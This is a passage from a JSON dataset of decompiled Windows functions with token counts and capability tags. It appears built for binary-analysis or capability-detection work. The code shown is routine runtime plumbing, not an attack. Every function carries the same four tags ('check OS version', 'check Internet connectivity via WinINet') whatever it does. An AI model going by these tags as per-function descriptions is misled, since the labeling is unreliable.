            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid fcn.0044f8dc(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_fffffe6c;\n    int32_t iStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_1h;\n    \n    puStack16 = 0x44f8f0;\n    fcn.00422be4();\n    uStack20 = 0x44fc8f;\n    iStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    *0x4aaf48 = *0x4aaf48 + 1;\n    puStack16 = &fcn.0044f8dc::var_1h + 1;\n    if (*0x4aaf44 == 0) {\n        puStack16 = &fcn.0044f8dc::var_1h + 1;\n        *0x4aaf44 = sub.kernel32.dll_LoadLibraryA(0x44fca0);\n        if (*0x4aaf44 != 0) {\n            *0x4aae84 = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44fcac);\n            *0x4aae88 = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44fcbc);\n            *0x4aae8c = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44fccc);\n            *0x4aae90 = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44fce0);\n            *0x4aae94 = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44fcf0);\n            *0x4aae98 = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44fcf0);\n            *0x4aae9c = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44fd10);\n            *0x4aaea0 = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44fd24);\n            *0x4aaea4 = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44fd38);\n            *0x4aaea8 = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44fd4c);\n            *0x4aaeac = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44fd68);\n            *0x4aaeb0 = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44fd80);\n            *0x4aaeb4 = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44fd90);\n            *0x4aaeb8 = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44fda0);\n            *0x4aaebc = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44fdb4);\n            *0x4aaec0 = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44fddc);\n            *0x4aaec4 = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44fdec);\n            *0x4aaec8 = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44fdfc);\n            *0x4aaecc = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44fe0c);\n            *0x4aaed0 = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44fe1c);\n            *0x4aaed4 = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44fe28);\n            *0x4aaed8 = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44fe3c);\n            *0x4aaedc = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44fe50);\n            *0x4aaee0 = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44fe60);\n            *0x4aaee4 = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44fe70);\n            *0x4aaee8 = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44fe80);\n            *0x4aaeec = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44fe90);\n            *0x4aaef0 = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44fea8);\n            *0x4aaef4 = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44feb8);\n            *0x4aaef8 = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44fecc);\n            *0x4aaefc = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44fee0);\n            *0x4aaf00 = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44fef8);\n            *0x4aaf04 = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44ff08);\n            *0x4aaf08 = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44ff18);\n            *0x4aaf0c = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44ff28);\n            *0x4aaf10 = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44ff3c);\n            *0x4aaf14 = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44ff4c);\n            *0x4aaf18 = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44ff5c);\n            *0x4aaf1c = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44ff68);\n            *0x4aaf20 = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44ff78);\n            *0x4aaf24 = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44ff94);\n            *0x4aaf28 = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44ffb0);\n            *0x4aaf2c = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44ffc8);\n            *0x4aaf30 = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44ffe0);\n            *0x4aaf34 = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44fff4);\n            *0x4aaf38 = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x450014);\n            in_stack_fffffe6c = *0x4aaf44;\n            *0x4aaf3c = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x450030);\n        }\n    }\n    *in_FS_OFFSET = in_stack_fffffe6c;\n    fcn.00422bec(0x44fc96);\n    return;\n}\n",
        "token_count": 1824
    },
    "00450040": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00450040(void)\n\n{\n    int32_t iVar1;\n    \n    if (((*0x4aaf44 != 0) && (iVar1 = (**0x4aaf18)(),  iVar1 != 0)) && (iVar1 = (**0x4aaf14)(),  iVar1 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 89
    },
    "00450068": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00450068(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x4500b0;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    *0x4aaf40 = *0x4aaf40 + 1;\n    if (*0x4aaf40 == 0) {\n        while (0 < *0x4aaf48) {\n            fcn.0044f71c();\n        }\n        fcn.00404640();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 167
    },
    "004500bc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004500bc(void)\n\n{\n    uint uVar1;\n    \n    if (*0x4aaf64 == NULL) {\n        if (*0x4aaf60 == 0) {\n            *0x4aaf60 = sub.kernel32.dll_LoadLibraryA(0x45012c);\n        }\n        uVar1 = 0x80004001;\n        if (*0x4aaf60 != 0) {\n            *0x4aaf64 = sub.kernel32.dll_GetProcAddress_1(*0x4aaf60, 0x450138);\n            if (*0x4aaf64 != NULL) {\n                uVar1 = (**0x4aaf64)();\n            }\n        }\n    }\n    else {\n        uVar1 = (**0x4aaf64)();\n    }\n    return uVar1;\n}\n",
        "token_count": 184
    },
    "00450158": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00450158(void)\n\n{\n    uint uVar1;\n    \n    if (*0x4aaf68 == NULL) {\n        if (*0x4aaf60 == 0) {\n            *0x4aaf60 = sub.kernel32.dll_LoadLibraryA(0x4501c4);\n        }\n        uVar1 = 0x80004001;\n        if (*0x4aaf60 != 0) {\n            *0x4aaf68 = sub.kernel32.dll_GetProcAddress_1(*0x4aaf60, 0x4501d0);\n            if (*0x4aaf68 != NULL) {\n                uVar1 = (**0x4aaf68)();\n            }\n        }\n    }\n    else {\n        uVar1 = (**0x4aaf68)();\n    }\n    return uVar1;\n}\n",
        "token_count": 187
    },
    "004501e8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t __fastcall fcn.004501e8(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    if (5 < **0x4a4d30) {\n        iVar1 = fcn.00450158();\n        if ((iVar1 == 0) && (param_1 != 0)) {\n            return CONCAT44(param_1, 1);\n        }\n    }\n    return param_1 << 0x20;\n}\n",
        "token_count": 101
    },
    "0045020c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045020c(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t iStack20;\n    int32_t iStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x450247;\n    iStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack16;\n    *0x4aaf5c = *0x4aaf5c + 1;\n    if ((*0x4aaf5c == 0) && (*0x4aaf60 != 0)) {\n        iStack20 = *0x4aaf60;\n        sub.kernel32.dll_FreeLibrary_1();\n    }\n    *in_FS_OFFSET = iStack20;\n    return;\n}\n",
        "token_count": 182
    },
    "00450fa0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00450fa0(void)\n\n{\n    uchar *puVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack20;\n    int32_t iStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x450ff9;\n    iStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack16;\n    *0x4aaf70 = *0x4aaf70 + 1;\n    if (*0x4aaf70 == 0) {\n        puVar1 = &stack0xfffffffc;\n        if ((*0x4aaf78 != '\\0') && (puVar1 = &stack0xfffffffc,  *0x4aaf74 != 0)) {\n            iStack20 = *0x4aaf74;\n            sub.kernel32.dll_FreeLibrary_1();\n            puVar1 = puStack8;\n        }\n        puStack8 = puVar1;\n        fcn.00406024();\n    }\n    *in_FS_OFFSET = iStack20;\n    return;\n}\n",
        "token_count": 252
    },
    "00451214": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00451214(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffcc;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x451293;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    sub.user32.dll_KillTimer(*(in_EAX + 0x34), 1);\n    if (((*(in_EAX + 0x30) != 0) && (*(in_EAX + 0x40) != '\\0')) && (*(in_EAX + 0x3a) != 0)) {\n        in_stack_ffffffcc = *(in_EAX + 0x34);\n        iVar1 = sub.user32.dll_SetTimer(in_stack_ffffffcc, 1, *(in_EAX + 0x30), 0);\n        if (iVar1 == 0) {\n            fcn.00407480();\n            fcn.0040d9f8();\n            fcn.00404eb4();\n        }\n    }\n    *in_FS_OFFSET = in_stack_ffffffcc;\n    fcn.0040546c(0x45129a);\n    return;\n}\n",
        "token_count": 303
    },
    "00451934": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00451934(void)\n\n{\n    uchar *puVar1;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack20;\n    uint32_t uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x451987;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    *0x4aaf88 = *0x4aaf88 + 1;\n    if (*0x4aaf88 == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (*0x4a45c0 != 0) {\n            uStack20 = *0x4a45c0;\n            sub.kernel32.dll_GlobalDeleteAtom();\n            puVar1 = puStack8;\n        }\n        puStack8 = puVar1;\n        fcn.00406024();\n    }\n    *in_FS_OFFSET = uStack20;\n    return;\n}\n",
        "token_count": 227
    },
    "00451ac0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00451ac0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    \n    if (*0x4aafbc != NULL) {\n        iVar2 = (**0x4aafbc)(arg_8h, arg_ch, arg_10h, arg_14h);\n        if (iVar2 != 0) {\n            uVar1 = 1;\n            goto code_r0x00451aec;\n        }\n    }\n    uVar1 = 0;\ncode_r0x00451aec:\n    return -uVar1;\n}\n",
        "token_count": 151
    },
    "00451af4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00451af4(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    \n    if (*0x4aafc0 != NULL) {\n        iVar2 = (**0x4aafc0)(arg_8h);\n        if (iVar2 != 0) {\n            uVar1 = 1;\n            goto code_r0x00451b14;\n        }\n    }\n    uVar1 = 0;\ncode_r0x00451b14:\n    return -uVar1;\n}\n",
        "token_count": 124
    },
    "00451ff8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00451ff8(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    if ((in_EAX != 0) && ((*(in_EAX + 0x1c) & 0x10) != 0)) {\n        if (*0x4aafd0 == 0) {\n            *0x4aafd0 = sub.user32.dll_RegisterWindowMessageA(0x45203c);\n        }\n        uVar1 = fcn.004601fc(0);\n        uVar1 = uVar1 & 0xffffff00 | uVar1 == 100;\n    }\n    return uVar1;\n}\n",
        "token_count": 157
    },
    "00452050": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00452050(void)\n\n{\n    if (*0x4aafcc == 0) {\n        *0x4aafcc = (**(*0x4a4630 + 4))();\n    }\n    return *0x4aafcc;\n}\n",
        "token_count": 62
    },
    "00452118": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00452118(uint param_1, uint32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if ((*(in_EAX + 6) != '\\0') && (*(in_EAX + 8 + (param_2 & 0xff) * 4) == 0)) {\n        uVar1 = (***0x4a4cdc)(0, *((param_2 & 0x7f) * 4 + 0x4a4638));\n        *(in_EAX + 8 + (param_2 & 0x7f) * 4) = uVar1;\n    }\n    return *(in_EAX + 8 + (param_2 & 0xff) * 4);\n}\n",
        "token_count": 174
    },
    "00452158": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00452158(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 5) != '\\0') && (*(in_EAX + 6) != '\\0')) && (*(in_EAX + 4) != '\\0')) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 75
    },
    "00452258": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00452258(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint in_ECX;\n    uint in_EDX;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((arg_ch == '\\0') || (arg_10h == 0)) {\n        cVar1 = '\\x01';\n    }\n    else {\n        uVar2 = fcn.00452118(*(arg_10h + 4), *(arg_10h + 8));\n        iVar3 = (***0x4a4cb4)(uVar2);\n        cVar1 = '\\x01' - (iVar3 == 0);\n    }\n    if (cVar1 != '\\0') {\n        (***0x4a4f08)(in_EDX, in_ECX, arg_8h);\n    }\n    return;\n}\n",
        "token_count": 216
    },
    "00452890": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00452890(void)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 6) != '\\0') {\n        fcn.00452184();\n    }\n    uVar1 = fcn.00450040();\n    *(in_EAX + 6) = uVar1;\n    return;\n}\n",
        "token_count": 81
    },
    "004528ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004528ac(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    if (in_EAX == 0) {\n        return 0;\n    }\n    if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n        fcn.00452050();\n        cVar1 = fcn.00452158();\n        if (cVar1 == '\\0') goto code_r0x004528c9;\ncode_r0x004528f3:\n        uVar2 = 1;\n    }\n    else {\ncode_r0x004528c9:\n        if (((*(in_EAX + 0x1c) & 0x10) != 0) && (*(in_EAX + 0x30) != 0)) {\n            fcn.00452050();\n            cVar1 = fcn.00452158();\n            if ((cVar1 != '\\0') && (cVar1 = fcn.00451ff8(),  cVar1 == '\\0')) goto code_r0x004528f3;\n        }\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 267
    },
    "004528f8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004528f8(void)\n\n{\n    uchar *puVar1;\n    uint *in_FS_OFFSET;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x45293d;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    *0x4aafc8 = *0x4aafc8 + 1;\n    if (*0x4aafc8 == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (**0x4a4b7c == '\\0') {\n            fcn.00404640();\n            puVar1 = puStack8;\n        }\n        puStack8 = puVar1;\n        fcn.0040546c();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 204
    },
    "00453968": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Removing unreachable block (ram,0x00453ad9)\n// WARNING: Removing unreachable block (ram,0x00453ae6)\n// WARNING: Removing unreachable block (ram,0x00453af3)\n// WARNING: Removing unreachable block (ram,0x00453af9)\n// WARNING: Removing unreachable block (ram,0x00453b06)\n// WARNING: Removing unreachable block (ram,0x00453b0c)\n// WARNING: Removing unreachable block (ram,0x00453b19)\n\nvoid fcn.00453968(void)\n\n{\n    uint8_t in_AL;\n    uint32_t uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_2h;\n    \n    puStack28 = &fcn.00453968::var_2h + 2;\n    uStack32 = 0x453b47;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uVar1 = in_AL;\n    if (uVar1 < 0x2d) {\n        if (uVar1 - 8 < 2) {\n            puStack28 = &fcn.00453968::var_2h + 2;\n            fcn.00405504();\n            goto code_r0x00453ad3;\n        }\n        if (uVar1 == 0xd) {\n            puStack28 = &fcn.00453968::var_2h + 2;\n            fcn.00405504();\n            goto code_r0x00453ad3;\n        }\n        if (uVar1 == 0x1b) {\n            puStack28 = &fcn.00453968::var_2h + 2;\n            fcn.00405504();\n            goto code_r0x00453ad3;\n        }\n        if (uVar1 - 0x20 < 9) {\n            puStack28 = &fcn.00453968::var_2h + 2;\n            fcn.00405504();\n            goto code_r0x00453ad3;\n        }\n    }\n    else if (uVar1 < 0x41) {\n        if (uVar1 - 0x2d < 2) {\n            puStack28 = &fcn.00453968::var_2h + 2;\n            fcn.00405504();\n            goto code_r0x00453ad3;\n        }\n        if (uVar1 - 0x30 < 10) {\n            puStack28 = &fcn.00453968::var_2h + 2;\n            fcn.00405654();\n            goto code_r0x00453ad3;\n        }\n    }\n    else {\n        if (uVar1 - 0x41 < 0x1a) {\n            fcn.00405654();\n            goto code_r0x00453ad3;\n        }\n        if (uVar1 - 0x60 < 10) {\n            puStack28 = &fcn.00453968::var_2h + 2;\n            fcn.00405654();\n            goto code_r0x00453ad3;\n        }\n        if (uVar1 - 0x70 < 0x18) {\n            puStack28 = &fcn.00453968::var_2h + 2;\n            fcn.00409c6c();\n            fcn.00405784();\n            goto code_r0x00453ad3;\n        }\n    }\n    puStack28 = &fcn.00453968::var_2h + 2;\n    fcn.00453914();\ncode_r0x00453ad3:\n    fcn.0040546c();\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x453b4e;\n    uStack32 = 0x453b46;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 894
    },
    "00453d4c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nchar __cdecl fcn.00453d4c(uint *arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    code *in_ECX;\n    int32_t in_EDX;\n    char var_9h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (in_EDX != 0) {\n        var_9h = '\\0';\n        while (var_9h == '\\0') {\n            iVar1 = fcn.004563c8();\n            if (iVar1 <= *in_EAX) {\n                return '\\0';\n            }\n            iVar1 = fcn.004563d8();\n            if (*(arg_8h + -1) <= *(iVar1 + 0x3f) && *(iVar1 + 0x3f) != *(arg_8h + -1)) {\n                return '\\0';\n            }\n            var_9h = (*in_ECX)(*arg_8h);\n            *in_EAX = *in_EAX + 1;\n        }\n    }\n    return var_9h;\n}\n",
        "token_count": 241
    },
    "00453db0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00453db0(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    char var_16h;\n    uint8_t var_15h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    var_10h = 0;\n    var_14h = 0;\n    iVar2 = 0;\n    iVar3 = 0;\n    if (param_2 != 0) {\n        iVar2 = fcn.004563c8();\n    }\n    if (param_1 != 0) {\n        iVar3 = fcn.004563c8();\n    }\n    var_16h = '\\0';\n    while ((var_16h == '\\0' && ((var_10h < iVar2 || (var_14h < iVar3))))) {\n        var_1h._0_1_ = 0xff;\n        var_15h = 0xff;\n        if (var_10h < iVar2) {\n            iVar1 = fcn.004563d8();\n            var_1h._0_1_ = *(iVar1 + 0x3f);\n        }\n        if (var_14h < iVar3) {\n            iVar1 = fcn.004563d8();\n            var_15h = *(iVar1 + 0x3f);\n        }\n        if (var_15h < var_1h) {\n            var_1h._0_1_ = var_15h;\n            var_16h = fcn.00453d4c(&var_1h + 1);\n        }\n        else {\n            var_16h = fcn.00453d4c(&var_1h + 1);\n        }\n        while ((var_10h < iVar2 && (iVar1 = fcn.004563d8(),  *(iVar1 + 0x3f) <= var_1h))) {\n            var_10h = var_10h + 1;\n        }\n        while ((var_14h < iVar3 && (iVar1 = fcn.004563d8(),  *(iVar1 + 0x3f) <= var_1h))) {\n            var_14h = var_14h + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 567
    },
    "00454248": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.00454248(uint param_1, char param_2)\n\n{\n    ushort uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.0041f670();\n    *(in_EAX + 0x3e) = 1;\n    *(in_EAX + 0x39) = 1;\n    *(in_EAX + 0x3b) = 2;\n    *(in_EAX + 0x3c) = 2;\n    uVar1 = fcn.00453d2c();\n    *(in_EAX + 0x50) = uVar1;\n    *(in_EAX + 0x40) = 0xffffffff;\n    iVar2 = fcn.00404610();\n    *(in_EAX + 0x78) = iVar2;\n    *(iVar2 + 0xc) = in_EAX;\n    *(iVar2 + 8) = 0x456d38;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 333
